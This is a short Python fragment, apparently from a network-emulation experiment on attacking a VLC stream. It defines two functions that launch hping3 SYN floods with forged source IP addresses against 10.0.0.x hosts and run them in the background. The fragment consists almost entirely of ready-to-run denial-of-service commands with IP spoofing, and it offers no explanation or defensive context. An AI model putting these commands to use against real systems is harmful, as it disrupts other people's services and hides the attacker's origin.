...
Ataque DoS streaming vlc Spoofing
...
def dos_attackH4( self, host):
    cmd = 'hping3 -a 8.8.6.6 -i u100000000000 -c 10000000 -d 500000 -w 64 -S -V --flood --rand-dest 10.0.0.x --interface eth0' 
    
    host.cmd(cmd + ' &') 
    info( 'Host 4 : %s\n'%cmd)
    
def dos_attackH5(self, host):
    cmd = ' hping3 -a 17.31.4.2 -i u100000000000  -S -V -c 10000000 -d 500000 -w 64 --flood 10.0.0.1' 
    host.cmd(cmd + ' &') 
    info( 'Host 5 : %s\n'%cmd)
